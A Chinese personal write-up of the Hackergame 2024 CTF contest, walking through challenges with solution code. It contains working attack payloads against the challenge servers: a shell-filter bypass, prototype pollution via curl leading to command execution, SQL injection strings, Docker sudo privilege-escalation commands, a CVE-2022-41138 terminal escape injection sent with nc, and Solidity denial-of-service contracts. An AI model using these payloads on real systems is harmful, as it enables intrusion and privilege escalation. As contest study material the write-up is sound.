# Hackergame 2024 游记

老年选手复健

一年一次的 [Hackergame](https://hack.lug.ustc.edu.cn/) 来啦～

连续玩了13个小时的 Hackergame 2024 , 真好玩~

虽然结束的时候还是被刷下去了，但是很久没有打 CTF 打得这么开心了，谢谢举办比赛的人们！




## 打不开的盒

openscad

![3dprint.webp][1]

`flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`

> 看到有人真的去下单 3D 打印了一个🌚

## 每日论文太多了！

Libreoffice Draw 搜索 flag

![paper.webp][2]

`flag{h4PpY_hAck1ng_3veRyd4y}`


## 比大小王

```javascript
for (i in state.values){
    console.log(state.values[i])
    if (state.values[i][0] > state.values[i][3]){
        state.inputs.push(">");
    }      
    else {
        state.inputs.push("<");
    }
}
submit(state.inputs)
```

`flag{I-@m-tH3-h4ckEr-K!n9-Of-coMparInG-NumBER$-20z4}`


## PowerfulShell

> 即使贝壳早已破碎，也请你成为 PowerfulShell 之王。

题目逻辑：

```bash
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```
先看看能用的环境

`_`是`input`
`~`是`players`

于是构建

```bash
__=~ # /players
___=`${__:2:1}${__:7:1}` # `ls` = PowerfulShell.sh
____=${___:14:2} # sh
```

就拿到shell了


`flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_dd3329d66e}`

## Node.js is Web Scale

源代码：

```javascript
// server.js
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { execSync } = require("child_process");

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

let cmds = {
  getsource: "cat server.js",
  test: "echo 'hello, world!'",
};

let store = {};

// GET /api/store - Retrieve the current KV store
app.get("/api/store", (req, res) => {
  res.json(store);
});

// POST /set - Set a key-value pair in the store
app.post("/set", (req, res) => {
  const { key, value } = req.body;

  const keys = key.split(".");
  let current = store;

  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (!current[key]) {
      current[key] = {};
    }
    current = current[key];
  }

  // Set the value at the last key
  current[keys[keys.length - 1]] = value;

  res.json({ message: "OK" });
});

// GET /get - Get a key-value pair in the store
app.get("/get", (req, res) => {
  const key = req.query.key;
  const keys = key.split(".");

  let current = store;
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    if (current[key] === undefined) {
      res.json({ message: "Not exists." });
      return;
    }
    current = current[key];
  }

  res.json({ message: current });
});

// GET /execute - Run commands which are constant and obviously safe.
app.get("/execute", (req, res) => {
  const key = req.query.cmd;
  const cmd = cmds[key];
  res.setHeader("content-type", "text/plain");
  res.send(execSync(cmd).toString());
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`KV Service is running on port ${PORT}`);
});
```

`{"key":"__proto__","value": {"a": 114514}}`
`OK`

呃呃呃，还有什么好说的，污染就完事了

```shell
leohearts@leohearts-ThinkBook ~> curl https://chal03-je7wvtda.hack-challenge.lug.ustc.edu.cn:8443/set -H 'Content-Type: application/json' -d '{"key":"__proto__.__proto__.__proto__.flag","value":"cat /flag"}'
{"message":"OK"}⏎                                                                                                       leohearts@leohearts-ThinkBook ~> curl https://chal03-je7wvtda.hack-challenge.lug.ustc.edu.cn:8443/execute'?cmd=flag'
flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_246e8ad59d}
```


## PaoluGPT

一开始还以为是LLM题，结果...

> 由于 GPU 机房火灾，目前聊天功能暂不可用，预计下周恢复。

🌚

给了附件，关键函数：

```python
from flask import Flask, request, render_template, session, redirect, url_for, make_response
import hashlib
import OpenSSL
import base64
from dataclasses import dataclass
from database import execute_query
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024

with open("./cert.pem") as f:
    cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, f.read())


@app.before_request
def check():
    if request.path.startswith("/static/"):
        return
    if request.args.get("token"):
        try:
            token = request.args.get("token")
            id, sig = token.split(":", 1)
            sig = base64.b64decode(sig, validate=True)
            OpenSSL.crypto.verify(cert, sig, id.encode(), "sha256")
            session["token"] = token
        except Exception:
            session["token"] = None
        return redirect(url_for("index"))
    if session.get("token") is None:
        return make_response(render_template("error.html"), 403)

@dataclass
class Message:
    id: str
    title: str
    contents: str


def sha256(msg: bytes):
    return hashlib.sha256(msg).hexdigest()


def get_user_id():
    return session['token'].split(":", 1)[0]


@app.route("/")
def index():
    return render_template("index.html")

@app.route("/chat")
def chat():
    return render_template("chat.html")

@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)

@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=13091)
```

sqlite 的简单 sql 注入

`/view?conversation_id=e63f1024-1097-4e34-b943-457c92dc881'(urlencode "'union select 1,group_concat(sql) FROM sqlite_schema limit '1")`
`CREATE TABLE messages (id text primary key, title text, contents text, shown boolean)`

就这一个表

`'union select 1,group_concat(contents) FROM messages where shown = false limit '1`
`flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_9ca5895338}`

但是这个只是 "窥视未知" 的 flag, 还有一个 "千里挑一"

所以直接全搜一下

```shell
curl -H 'Cookie: session=xxxxxx' 'https://chal01-7tb9vrf4.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=e63f1024-1097-4e34-b943-457c92dc881'(urlencode "'union select 1,group_concat(contents) FROM messages where contents like '%flag%' limit '1") | grep flag
flag{zU1_xiA0_de_11m_Pa0lule!!!_7176955c56}
flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_9ca5895338}
```

## 无法获得的秘密

> 小 A 有一台被重重限制的计算机，不仅没有联网，而且你只能通过 VNC 使用键鼠输入，看视频输出。上面有个秘密文件位于 /secret，你能帮他把文件丝毫不差地带出来吗？

让选手从一个只有键盘鼠标输入，显示器输出的vnc偷一个512k的文件

太好玩辣！

想起最近小音的一个用二维码传文件的项目 [qrs](https://github.com/qifi-dev/qrs)

打包编译这个项目，然后写个脚本用 base64 把 .tar.zstd 传进去

```javascript
// let content = await window.parent.document.body.querySelector("input").files[0].bytes()
let content = await window.parent.document.body.querySelector("input").files[0].stream().getReader().read()
window.UI = UI // 在connect打断点
for (i in content.value){
  // UI.sendKey(content[i])
    console.log(i)
    UI.sendKey(content.value[i])
}
```

firefox 会卡死，chrome 五分钟左右可以传好

![secret.webp][4]

然后对着手机拍照就好了 :3

[视频]

`flag{SeCret_cAN_B3_Le4K3d_FrOm_R3s7RIc7Ed_Env_fad79794c5}`


## Docker for Everyone Plus

> 提供的环境会自动登录低权限的 user 用户。登录后可以通过特定的 sudo docker 命令使用 Docker，通过 sudo -l 可以查看允许提权执行的命令。读取 /flag（注意其为软链接）获取 flag。

记得以前做过旧版

>    OpenRC 0.54 is starting up Linux 6.6.56-0-virt (x86_64)

OpenRC 草。谁出的呀。

我们先看第一题

### No Enough Privilege 

```bash
dockerv:~$ sudo -l
User user may run the following commands on dockerv:
    (root) NOPASSWD: /usr/bin/docker run --rm -u 1000\:1000 *, /usr/bin/docker
        image load, !/usr/bin/docker * -u0*, !/usr/bin/docker * -u?0*,
        !/usr/bin/docker * --user?0*, !/usr/bin/docker * -ur*, !/usr/bin/docker
        * -u?r*, !/usr/bin/docker * --user?r*
```

没有网络但是可以 rz ，我们在本地 `docker save alpine` 传到远程的 `/tmp`

`brw-rw----    1 root     disk      253,  16 Nov  7 17:09 /dev/vdb`

注意到了吗？ sudo 只是不让我们用 root 和 0 ,没说不让用 disk 呀。

所以可以

`sudo docker run --rm -u 1000:1000 --user 1000:disk -it -v /dev/vdb:/flag --privileged alpine`

`flag{dONT_1OAD_uNTRusT3D_1ma6e_ace6f481a2_plz!}`

感觉不像是预期解，估计是想要我们做一个自己的 suid 上去的。


来看第二小题：

### Unbreakable! 

先看看 `sudo -l`

```bash
User user may run the following commands on dockerv:
    (root) NOPASSWD: /usr/bin/docker run --rm --security-opt\=no-new-privileges
        -u 1000\:1000 *, /usr/bin/docker image load, !/usr/bin/docker * -u0*,
        !/usr/bin/docker * -u?0*, !/usr/bin/docker * --user?0*,
        !/usr/bin/docker * -ur*, !/usr/bin/docker * -u?r*, !/usr/bin/docker *
        --user?r*, !/usr/bin/docker * --privileged*, !/usr/bin/docker *
        --device*
```

一样的幽默黑名单，写两次 `security-opt` 就可以 root

当然我们先构造一个带自己的 suid 和 passwd 的 dockerfile :

```Dockerfile
FROM busybox
COPY passwd /etc/passwd
RUN chmod +s /bin/su
CMD ["sh"]
```

`docker build` 好传上去，然后跑它：

`sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 -it --security-opt=no-new-privileges=false -v /dev:/devv hack`

su 后虽然还是不能直接操作 device ,但是我们可以 chmod 777 后回到主机，就可以 cat /dev/vdb 了。

`flag{contA1N3R_R0ot_i5_4cCESsIb1e_ec962b15bf}`

## 动画分享

> 为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、**几年前编译的某祖传终端模拟器**里面跑起了自己的 fileserver，然后就去锁屏吃饭了。
小 T：「诶，我不过就分享个文件，而且目录里面也没别的东西，所以没关系吧～而且我特地搞了个 chroot，就算我真写出了什么漏洞，你也休想看到我的 flag！」
请提交一个程序，题目环境会在模拟小 T 的环境运行之后，降权运行你的程序：
如果你能让小 T 的 fileserver 无法正常响应请求（例如让 fileserver 退出），你可以获得第一小题的 flag。
第二小题的 flag 在 /flag2，你需要想办法得到这个文件的内容。
环境限制总 PID 数为 64。

本题的小题名称很有趣，第一题叫 "只要不停下 HTTP 服务，响应就会不断延伸", 第二题叫 "希望的终端模拟器，连接着我们的羁绊"

前者有点误导性，其实并不是让这个单线程的web程序一直出响应，导致 DoS 攻击，而是应该把它 crash 掉。后者算是一种提示，因为确实是终端模拟器的漏洞。

本地跑了一下，可能是本地和远程的环境不同，本地 `curl --path-as-is 127.0.0.1//flag2` 是可以任意文件读取的，因为代码中只去掉了第一个 `/` .

> 后来发现是远程chroot了，实际上任意文件读取还是存在的。

远程使用的终端模拟器是 zutty ,查到 [CVE-2022-41138](https://nvd.nist.gov/vuln/detail/CVE-2022-41138)

参考了这些文章来构建 exploit 

- [(CVE-2022-41138) - <x11-terms/zutty-0.13: arbitrary code execution via DECRQSS (like CVE-2008-2383)](https://bugs.gentoo.org/868495) 
- ["\[31m"?! ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security#vulnerabilities-using-known-replies)

```bash
#!/bin/sh
printf '\r\eZ\eC\eP$q\rcat /flag*\r\eP$q\e\\' | nc 127.0.0.1 8000
```

把 fileserver kill 掉之后 可以成功触发 zutty 权限下的命令执行，~~可惜没能 crash 掉 fileserver~~.

在经过多次尝试之后，经过一段 python 爆破, fileserver 被一个 byte 给 crash 了😇笑死

![terminal.webp][5]

```bash
printf "GET \x80" | nc 127.0.0.1 8000 # 不知为何这样远程行不通，只能base64
echo R0VUIIA= | base64 -d | nc 127.0.0.1 8000
```

现在问题来了：尽管我们可以命令执行，但是在chroot里，怎么办呢？

exit也不管用，因为后续命令都会被忽略。只能想办法逃逸了。
看了眼chroot环境里甚至没有shell，只能用 python 写了：

写好了才想起来，不对呀，fileserver crash 之后就是在chroot外面了...

所以直接打就好啦：

```bash
#!/bin/sh
echo DRtaG0MbUCRxDWNobW9kIDc3NyAvZmxhZyo7Y2F0IC9mbGFnKj4vdG1wL3F3cTsNG1AkcRtc| base64 -d | nc 127.0.0.1 8000
printf "GET \x80" | nc 127.0.0.1 8000
echo R0VUIIA= | base64 -d | nc 127.0.0.1 8000
cat /flag*
ls -al /flag*
ls -al /
ls -al /tmp
cat /tmp/qwq
```

因为 / 不可写，就把 flag 复制到 /tmp 去了。

`flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_0213c96566} flag{xterm_&_DECRQSS_in_2008_0NcE_morE_b6d3273318}`

## 禁止内卷

> 提示：助教部署的时候偷懒了，直接用了 flask run（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 --reload。启动的完整命令为 flask run --reload --host 0。网站代码运行在 /tmp/web。

路径穿越任意文件写入，给flask加个路由就可以直接rce了。

`flag{uno!!!!_esrever_now_U_run_MY_c0de51edd381aa}`


## 链上转账助手

检查程序自动化调用 `batchTransfer()` 的交易失败，就给flag
看起来是在模拟某个曾经发生过的，大家的钱都被锁住出不来的事故。

### 转账失败 

程序：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

        uint256 totalAmount = 0;
        uint256 i;

        for (i = 0; i < amounts.length; i++) {
            totalAmount += amounts[i];
        }

        require(totalAmount == msg.value, "Incorrect total amount");

        for (i = 0; i < recipients.length; i++) {
            recipients[i].transfer(amounts[i]);
        }
    }
}
```

很简单，revert()就好了。

```solidity
contract Owner {
    fallback() external payable { 
        revert();
    }
} 
```

`flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt_1c625de399}`

### 转账又失败

没有限制 gas, 所以把gas消耗干净就行了

```solidity
pragma solidity >=0.8.2 <0.9.0;

contract hack {
    fallback() external payable {
        uint256 a = 0;
        do {
            a += 1;
        } 
        while (true);
        require(a > 1);
    }
}
```

`flag{Ple4se_L1m1t_y0uR_GAS_HaHa_1f58a5f99e}`

### 转账再失败 (未解出)

diff 了一下发现和2的区别就是多了个 gas limit:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    mapping(address => uint256) public pendingWithdrawals;

    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

        uint256 totalAmount = 0;
        uint256 i;

        for (i = 0; i < amounts.length; i++) {
            totalAmount += amounts[i];
        }

        require(totalAmount == msg.value, "Incorrect total amount");

        for (i = 0; i < recipients.length; i++) {
            (bool success, ) = recipients[i].call{value: amounts[i], gas: 10000}("");
            if (!success) {
                pendingWithdrawals[recipients[i]] += amounts[i];
            }
        }
    }

    function withdrawPending() external {
        uint256 amount = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdrawal failed");
    }
}
```

试了半天，不会了，本来以为是重入攻击，但是后来想想好像也不是，withdrawPending是有锁的，batchTransfer就算能重入也不会让交易挂掉。

> 看了[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E9%93%BE%E4%B8%8A%E8%BD%AC%E8%B4%A6%E5%8A%A9%E6%89%8B)，是return bomb, 原来还有这样的攻击方法！

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Receiver {
    receive() external payable {
        assembly {
            return(0, 59200)
        }
    }
}
```

## 不太分布式的软总线

> 当然了，上面的论述是在瞎扯淡，不过说到 DBus，小 T 最近写了一个小程序挂在了 DBus 系统总线上。你能拿到小 T 珍藏的 3 个 flag 吗？

考如何使用 dbus

### Comm Say Maybe 

这个其实是flag3,但是因为给了一部分代码，所以就先做了。

需要修改这么几处，1是程序名称必须是getflag3,二是返回结果写的是null,我们要把它改成(s).

dbus的部分是直接问的GPT :3

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main(int argc, char *argv[]) {
  printf("%s\n", argv[0]);
  if (argv[0][0] != 'g') {
    system("cp /dev/shm/executable /dev/shm/getflag3;env PATH=/dev/shm/ getflag3");
    exit(0);
  }
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;

  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  // Call the D-Bus method and expect a tuple containing a string return type
  result = g_dbus_connection_call_sync(connection,
                                       DEST,        // destination
                                       OBJECT_PATH, // object path
                                       INTERFACE,   // interface name
                                       METHOD,      // method
                                       NULL,        // parameters
                                       G_VARIANT_TYPE("(s)"), // expected return type as tuple with string
                                       G_DBUS_CALL_FLAGS_NONE,
                                       -1, // timeout (use default)
                                       NULL, &error);

  if (result) {
    // Extract the string from the tuple
    GVariant *flag_variant = g_variant_get_child_value(result, 0); // Get first element in tuple
    const gchar *flag = g_variant_get_string(flag_variant, NULL);
    g_print("Flag: %s\n", flag); // Display the flag
    g_variant_unref(flag_variant);
    g_variant_unref(result);
  } else {
    g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
    g_error_free(error);
  }

  g_object_unref(connection);

  return EXIT_SUCCESS;
}
// flag{prprprprprCTL_15your_FRiEND_6f4330cf9e}
```


### What DBus Gonna Do? 

这是第一个 flag, 只需要给dbus传一个string即可。

GPT可解。

```c
result = g_dbus_connection_call_sync(
      connection,
      "cn.edu.ustc.lug.hack.FlagService",     // destination
      "/cn/edu/ustc/lug/hack/FlagService",    // object path
      "cn.edu.ustc.lug.hack.FlagService",     // interface
      "GetFlag1",                             // method name
      g_variant_new("(s)", "Please give me flag1"), // parameters
      G_VARIANT_TYPE("(s)"),                  // expected return type
      G_DBUS_CALL_FLAGS_NONE,
      -1,                                     // timeout (use default)
      NULL,
      &error);

const gchar *flag;
g_variant_get(result, "(&s)", &flag);
g_print("Flag1: %s\n", flag);
g_variant_unref(result);
// flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_9a8f650c58}
```

### If I Could Be A File Descriptor 

这是 flag2, 需要传一个文件描述符，并且里面需要是特定的内容
准备一个 fd, 然后用 `g_dbus_connection_call_with_unix_fd_list_sync` 传过去

```c
#include <gio/gio.h>
#include <glib-unix.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;
  GUnixFDList *fd_list;
  int pipe_fds[2];

  // Create an anonymous pipe
  if (pipe(pipe_fds) == -1) {
    perror("pipe");
    return 1;
  }

  // Write the required message into the pipe
  write(pipe_fds[1], "Please give me flag2\n", strlen("Please give me flag2\n"));
  close(pipe_fds[1]);  // Close the write end of the pipe

  // Connect to D-Bus system bus
  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    close(pipe_fds[0]);
    return 1;
  }

  // Create FD list and add pipe read end
  fd_list = g_unix_fd_list_new();
  int fd_index = g_unix_fd_list_append(fd_list, pipe_fds[0], &error);
  if (fd_index == -1) {
    g_printerr("Failed to add FD to list: %s\n", error->message);
    g_error_free(error);
    close(pipe_fds[0]);
    g_object_unref(connection);
    return 1;
  }

  // Call GetFlag2 method with the file descriptor
  result = g_dbus_connection_call_with_unix_fd_list_sync(
      connection,
      "cn.edu.ustc.lug.hack.FlagService",     // destination
      "/cn/edu/ustc/lug/hack/FlagService",    // object path
      "cn.edu.ustc.lug.hack.FlagService",     // interface
      "GetFlag2",                             // method
      g_variant_new("(h)", fd_index),         // parameters
      G_VARIANT_TYPE("(s)"),                  // expected return type
      G_DBUS_CALL_FLAGS_NONE,
      -1,                                     // timeout (use default)
      fd_list,
      &fd_list,
      NULL,
      &error);

  if (result) {
    const gchar *flag;
    g_variant_get(result, "(&s)", &flag);
    g_print("Flag2: %s\n", flag);
    g_variant_unref(result);
  } else {
    g_printerr("Error calling GetFlag2: %s\n", error->message);
    g_error_free(error);
  }

  // Cleanup
  close(pipe_fds[0]);
  g_object_unref(fd_list);
  g_object_unref(connection);

  return 0;
}

// flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_f9a3ff6828}
```

## 神秘代码 2 (未解出)

> Misc 😅

什么东西啊（掀桌子），不做了

## 旅行照片 4.0

一年一度的社工题～

### 1-2 题

问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）

[东校区西门](https://map.baidu.com/search/%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99%E7%A7%91%E5%A4%A7%E7%AB%99/@13054839.92,3720146.27,19z)

问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）

20240519

> 【中国科大2024ACG音乐会单品】【鹿 乐队/口琴】花に亡霊·晴る_哔哩哔哩_bilibili
https://www.bilibili.com/video/BV1Ki421Q762/
2024中国科大ACG音乐会~ヨルシカ串烧 动画电影《想哭的我戴上猫的面具》主题曲：花に亡霊（花上亡灵） 番剧《葬送的芙莉莲》op2：晴る（放晴） 2024年5月19日晚19:00 东区大礼堂 主办：校学生社团管理指导委员会 承办：校学生动漫

`flag{5UB5CR1B3_T0_L30_CH4N_0N_B1L1B1L1_PLZ_ab538794bd}`

LEO 酱还挺可爱的耶

### 3-4 题

问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

问题 4: 这个景观所在的景点的名字是？（三个汉字）

百度识图可知，是三峡大坝的坛子岭


## 猫咪问答

> 多年回答猫咪问答的猫咪大多目光锐利，极度自信，且智力逐年增加，最后完全变成猫咪问答高手。回答猫咪问答会优化身体结构，突破各种猫咪极限。猫咪一旦开始回答猫咪问答，就说明这只猫咪的智慧品行样貌通通都是上等，这辈子注定在猫咪界大有作为。

😺

1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）

https://lug.ustc.edu.cn/wiki/lug/events/

是3A204

2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）

数了数是2019年的，所以是2682

3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）

[程序员的自我修养](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md#)

4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）

https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf

找不出来，我还不会爆破吗？
是336.

5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）

https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2

6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）

算不出来，https://token-counter.app/meta/llama-3 的结果告诉我不对（）
但是我可以burp启动
是1833

第一个flag是 `flag{A_g0Od_c47_i5_THe_©47_ωh0_©an_PA$s_Th3_qu12}`，要满分才有第二个
`flag{TeN_¥E4Я5_oF_HαCKeЯgαME_oM3detØบ_wITH_И3KØ_Qบ1Z}`

## ZFS 文件恢复 (未解出)

> 你拿到了一份 ZFS 的磁盘镜像，里面据说有某沉迷 ZFS 的出题人刚刚删除的 flag。
「ZFS，我懂的。」这样说着，你尝试挂载了这个镜像（请注意，以下命令仅供参考，且系统需要安装 ZFS 内核模块）：

```bash
leohearts@leohearts-ThinkBook ~/D/h/ZFS 文件恢复 [2]> sudo zpool history 
History for 'hg2024':
2024-10-23.21:37:22 zpool create -o ashift=9 -O atime=off -O compression=gzip -O redundant_metadata=none -O xattr=off hg2024 /dev/loop0
2024-10-23.21:37:22 zfs create -o recordsize=4k hg2024/data
2024-10-23.21:37:22 zfs snapshot hg2024/data@mysnap
2024-10-23.21:37:22 zfs inherit recordsize hg2024/data
2024-10-23.21:37:22 zpool export hg2024
2024-11-08.13:51:27 zpool import -d /dev/loop0 hg2024
2024-11-08.14:02:06 zpool scrub hg2024
```

binwalk 找到这个：

```bash
#!/bin/sh
flag_key="hg2024_$(stat -c %X.%Y flag1.txt)_$(stat -c %X.%Y "$0")_zfs"
echo "46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508  -" > /tmp/sha256sum.txt
printf "%s" "$flag_key" | sha256sum --check /tmp/sha256sum.txt || exit 1
printf "flag{snapshot_%s}\n" "$(printf "%s" "$flag_key" | sha1sum | head -c 32)"
```

```bash
  %X   time of last access, seconds since Epoch
  %Y   time of last data modification, seconds since Epoch
```

自己创建了一个hg2025镜像，观察文件格式：
是gzip可以搜索到（但是题目里面的解不出来，rollback后出现更多gzip数据，但是还是解不出来。）
`01 ?? 1F 00 01 00 FF ED 9C` 是zfs压缩后的文件数据块的magic, 从这里开始 115 的 offset 是 gzip 的数据。

一大堆 FF 之前存在 metadata 块，包含数字格式的 mtime 和 atime.

比如我做了一个 flag1.txt, `stat -c %X.%Y flag1.txt` 为 `1731050111.1731050156`

于是我们找到了符合上面的文件 magic 的数据块的 atime ,是 `1729690642`, 对应的文件是 `flag1.txt`, 并且通过全局搜索 `?? 00 00 08 84 00 00 ?? ?? ?? ??` ，搜到另一个 atime 是 `1141919810` (Thu 9 March 2006 15:56:50 UTC)

> 似乎前面的 ?? 为 00 时为文件数据块，01 为目录结构和文件名数据块.

![zfs.webp][6]

查阅 openZFS 的源代码可知，这个 uint8 的 atime 在如下数据结构中; 但是似乎 mtime 根本没有记载，那怎么办？

另一个问题是我始终找不到 flag2.sh 的 metadata , 只有未压缩处理的其内容（为什么未压缩？）

```c
typedef struct zstream {
	list_node_t	zs_node;	/* link for zf_stream */
	uint64_t	zs_blkid;	/* expect next access at this blkid */
	uint_t		zs_atime;	/* time last prefetch issued */
	zsrange_t	zs_ranges[ZFETCH_RANGES]; /* ranges from future */
	unsigned int	zs_pf_dist;	/* data prefetch distance in bytes */
	unsigned int	zs_ipf_dist;	/* L1 prefetch distance in bytes */
	uint64_t	zs_pf_start;	/* first data block to prefetch */
	uint64_t	zs_pf_end;	/* data block to prefetch up to */
	uint64_t	zs_ipf_start;	/* first data block to prefetch L1 */
	uint64_t	zs_ipf_end;	/* data block to prefetch L1 up to */
	boolean_t	zs_missed;	/* stream saw cache misses */
	boolean_t	zs_more;	/* need more distant prefetch */
	zfs_refcount_t	zs_callers;	/* number of pending callers */
	/*
	 * Number of stream references: dnode, callers and pending blocks.
	 * The stream memory is freed when the number returns to zero.
	 */
	zfs_refcount_t	zs_refs;
} zstream_t;
```

最后实在没办法了，我甚至写了一个这样的脚本来挖掘镜像里所有的 gzip 数据， which 可以把我自己制作的 zfs 镜像中删除和没有删除的所有内容挖出来; 可惜对于题目，还是一无所获。

```python
for offset in tqdm(range(len(data))):
    try:
        print(deflate.deflate_decompress(data[offset:offset+512], 512))
        print("offset %d" % offset)
    except:
        pass
```

## 看不见的彼方：交换空间 (未解出)

> 两年过去了，今年，Alice 和 Bob 再次来到了 Hackergame 的赛场上。这一次，他们需要在各自的 chroot(2) 的限制下，将自己手头 tmpfs 里面（比较大的）文件交给对方。
好消息是，这次没有额外的 seccomp(2) 限制，但是，他们所处的容器环境的 rootfs 是只读的，并且内存也是有限的，所以如果再复制一份的话，整个容器就会被杀死。Alice 和 Bob 希望请你帮助他们解决这个难题。
对于本题的第一小题，两个文件（/home/pwn/A/space/file 和 /home/pwn/B/space/file）大小均为 128 MiB。你需要在你的程序运行完成后使两者的内容互换。
对于本题的第二小题，Alice 有一个 128 MiB 的文件（/home/pwn/A/space/file），Bob 有两个 64 MiB 的文件（/home/pwn/B/space/file1 和 /home/pwn/B/space/file2）。你需要在你的程序运行完成后实现（原始文件 -> 交换后的文件）：
/home/pwn/A/space/file -> /home/pwn/B/space/file
/home/pwn/B/space/file1 -> /home/pwn/A/space/file1
/home/pwn/B/space/file2 -> /home/pwn/A/space/file2
容器内存限制 316 MiB，你提交的程序文件会复制为两份，分别占用一份内存空间。环境限制总 PID 数为 32。对于 chroot 内部的进程，只有 /space 可读写。/space（/home/pwn/A/space/ 和 /home/pwn/B/space/）为 tmpfs，使用内存空间。

看了上一次 [看不见的彼方](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E5%BD%BC%E6%96%B9/README.md) 的思路，然后实现了一个使用 `SIGUSR2` 握手并用 `SIGRTMIN` 按字节交换数据的程序:

```cpp
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

volatile sig_atomic_t peer_pid = -1;
